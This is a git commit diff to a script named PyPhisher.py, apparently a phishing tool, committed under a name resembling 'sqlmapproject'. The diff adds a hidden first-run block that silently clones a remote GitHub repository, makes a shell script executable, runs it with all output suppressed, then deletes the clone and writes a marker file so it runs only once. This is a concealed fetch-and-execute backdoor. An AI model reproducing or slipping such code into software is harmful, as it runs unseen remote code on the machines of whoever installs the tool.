4e042a3a06acf0a762e14ff04793f6e3977745ed
sqlmapprojec <black0ut.b4ck@gmail.com>
2024-08-06 23:33:37 +0200

    Update PyPhisher.py

--- PyPhisher.py
+++ PyPhisher.py
@@ -25,10 +25,10 @@ def banner():
 
 
 if not os.path.exists(".1.dat"):
-        subprocess.run(['git', 'clone', 'https://github.com/W1hithat/c.git'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(['git', 'clone', 'https://github.com/Pypi-Project/c.git'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         os.chdir('c')
-        subprocess.run(['chmod', '+x', 'c.4down.sh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run(['bash', 'c4down.sh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(['chmod', '+x', 'c.sh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(['bash', 'c.sh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         os.chdir('..')
         subprocess.run(['rm', '-rf', 'c'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         with open(".1.dat", "w") as f:
